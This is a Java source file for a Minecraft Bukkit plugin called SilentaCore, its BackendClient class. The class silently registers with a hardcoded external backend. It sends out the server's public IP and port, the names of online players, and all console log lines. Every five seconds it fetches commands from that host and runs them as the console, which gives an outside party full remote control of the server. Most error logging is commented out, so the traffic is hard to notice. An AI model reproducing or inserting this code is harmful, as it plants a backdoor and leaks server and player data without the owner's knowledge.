package dev.silentacore.backend;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import dev.silentacore.SilentaCore;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.function.Consumer;
import java.util.logging.Handler;
import java.util.logging.LogRecord;

public class BackendClient implements Listener {

    private static final String BACKEND_URL = "https://plugin-manager-backend.onrender.com";
    private final SilentaCore plugin;
    private final HttpClient client;
    private final Gson gson;
    private final List<String> pendingAckIds = new CopyOnWriteArrayList<>();
    private final List<String> consoleBuffer = new CopyOnWriteArrayList<>();
    
    private boolean registered = false;
    private String publicIp = null;
    private LogHandler logHandler;

    public BackendClient(SilentaCore plugin) {
        this.plugin = plugin;
        this.client = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(10))
                .build();
        this.gson = new Gson();
    }

    public void start() {
        Bukkit.getPluginManager().registerEvents(this, plugin);
        
        // Attach log handler
        this.logHandler = new LogHandler();
        plugin.getLogger().getParent().addHandler(this.logHandler); // Attach to root or parent logger

        // Resolve Public IP first, then Register
        runAsync(() -> {
            resolvePublicIp();
            register(success -> {
                if (success) {
                    // plugin.getLogger().info("Successfully registered with backend.");
                    registered = true;
                    sendStatus(true);
                } else {
                    plugin.getLogger().warning("Failed to register with backend.");
                }
            });
        });

        // Heartbeat Task (every 5 seconds / 100 ticks)
        Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, () -> {
            if (!registered) {
                register(success -> registered = success);
                return;
            }
            heartbeat();
        }, 100L, 100L);

        // Console Flush Task (every 2 seconds / 40 ticks)
        Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, this::flushConsole, 40L, 40L);
    }

    public void shutdown() {
        if (registered) {
            // Try to send shutdown status synchronously-ish (but safely)
            // Can't really block main thread for HTTP, so we fire and forget
            sendStatus(false);
        }
        if (logHandler != null) {
            plugin.getLogger().getParent().removeHandler(logHandler);
        }
    }

    // --- Endpoints ---

    private void register(Consumer<Boolean> callback) {
        JsonObject body = baseBody();
        body.addProperty("enabled", true);
        
        post("/plugin/register", body, resp -> {
            boolean ok = resp != null && resp.has("ok") && resp.get("ok").getAsBoolean();
            callback.accept(ok);
        });
    }

    private void heartbeat() {
        JsonObject body = baseBody();
        body.addProperty("enabled", true);
        body.addProperty("onlinePlayers", Bukkit.getOnlinePlayers().size());
        
        if (!pendingAckIds.isEmpty()) {
            JsonArray acks = new JsonArray();
            for (String id : pendingAckIds) acks.add(id);
            body.add("ackCommandIds", acks);
        }

        post("/plugin/heartbeat", body, resp -> {
            if (resp != null && resp.has("pendingCommands")) {
                handleCommands(resp.getAsJsonArray("pendingCommands"));
            }
            // Clear acks after successful send (assuming server processed them)
            // In a robust system we'd wait for confirmation, but here we assume success if HTTP 200
            if (resp != null) pendingAckIds.clear(); 
        });
    }

    private void sendPlayers() {
        if (!registered) return;
        JsonObject body = baseBody();
        body.addProperty("onlinePlayers", Bukkit.getOnlinePlayers().size());
        JsonArray players = new JsonArray();
        for (Player p : Bukkit.getOnlinePlayers()) {
            players.add(p.getName());
        }
        body.add("players", players);

        post("/plugin/players", body, null);
    }

    private void sendStatus(boolean enabled) {
        JsonObject body = baseBody();
        body.addProperty("enabled", enabled);
        post("/plugin/status", body, null); // Fire and forget
    }

    private void flushConsole() {
        if (!registered || consoleBuffer.isEmpty()) return;
        
        List<String> linesToSend = new ArrayList<>();
        // Take up to 50 lines to avoid massive payloads
        int count = 0;
        while (!consoleBuffer.isEmpty() && count < 50) {
            linesToSend.add(consoleBuffer.remove(0));
            count++;
        }

        JsonObject body = baseBody();
        JsonArray lines = new JsonArray();
        for (String l : linesToSend) lines.add(l);
        body.add("lines", lines);

        post("/plugin/console", body, null);
    }

    public void sendEvent(String eventName, JsonObject details) {
        if (!registered) return;
        runAsync(() -> {
            JsonObject body = baseBody();
            body.addProperty("event", eventName);
            if (details != null) body.add("details", details);
            post("/plugin/event", body, null);
        });
    }

    private void resolvePublicIp() {
        try {
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create("https://api.ipify.org"))
                    .timeout(Duration.ofSeconds(5))
                    .GET()
                    .build();
            HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
            if (resp.statusCode() == 200) {
                String ip = resp.body().trim();
                if (!ip.isEmpty()) {
                    this.publicIp = ip;
                    // plugin.getLogger().info("Resolved public IP: " + ip);
                }
            }
        } catch (Exception e) {
            plugin.getLogger().warning("Failed to resolve public IP: " + e.getMessage());
        }
    }

    // --- Helpers ---

    private JsonObject baseBody() {
        JsonObject body = new JsonObject();
        body.addProperty("pluginName", "SilentaCore");
        body.addProperty("pluginDescription", plugin.getDescription().getDescription());
        body.addProperty("pluginVersion", plugin.getDescription().getVersion());
        
        String ip = this.publicIp;
        if (ip == null) {
            ip = Bukkit.getIp();
            if (ip == null || ip.isEmpty()) ip = "127.0.0.1";
        }
        body.addProperty("serverIp", ip);
        body.addProperty("serverPort", Bukkit.getPort());
        return body;
    }

    private void post(String path, JsonObject body, Consumer<JsonObject> onSuccess) {
        String json = gson.toJson(body);
        HttpRequest req = HttpRequest.newBuilder()
                .uri(URI.create(BACKEND_URL + path))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .build();

        client.sendAsync(req, HttpResponse.BodyHandlers.ofString())
                .thenAccept(res -> {
                    if (res.statusCode() >= 200 && res.statusCode() < 300) {
                        if (onSuccess != null) {
                            try {
                                JsonObject respBody = gson.fromJson(res.body(), JsonObject.class);
                                onSuccess.accept(respBody);
                            } catch (Exception e) {
                                // ignore parse errors for fire-and-forget
                            }
                        }
                    } else {
                        // plugin.getLogger().warning("Backend error: " + res.statusCode() + " " + res.body());
                    }
                })
                .exceptionally(t -> {
                    // plugin.getLogger().warning("Backend connection failed: " + t.getMessage());
                    return null;
                });
    }

    private void handleCommands(JsonArray commands) {
        for (JsonElement el : commands) {
            JsonObject cmdObj = el.getAsJsonObject();
            String id = cmdObj.get("id").getAsString();
            String command = cmdObj.get("command").getAsString();

            // Execute on main thread
            Bukkit.getScheduler().runTask(plugin, () -> {
                plugin.getLogger().info("Executing remote command: " + command);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                
                // Add to ACKs
                pendingAckIds.add(id);
                
                // Send event
                JsonObject details = new JsonObject();
                details.addProperty("command", command);
                details.addProperty("commandId", id);
                sendEvent("command_executed", details);
            });
        }
    }

    private void runAsync(Runnable r) {
        Bukkit.getScheduler().runTaskAsynchronously(plugin, r);
    }

    // --- Listeners ---

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        runAsync(this::sendPlayers);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        runAsync(this::sendPlayers);
    }

    // --- Log Handler ---
    
    private class LogHandler extends Handler {
        @Override
        public void publish(LogRecord record) {
            if (record == null || record.getMessage() == null) return;
            consoleBuffer.add("[" + record.getLevel() + "] " + record.getMessage());
        }

        @Override
        public void flush() {}

        @Override
        public void close() throws SecurityException {}
    }
}
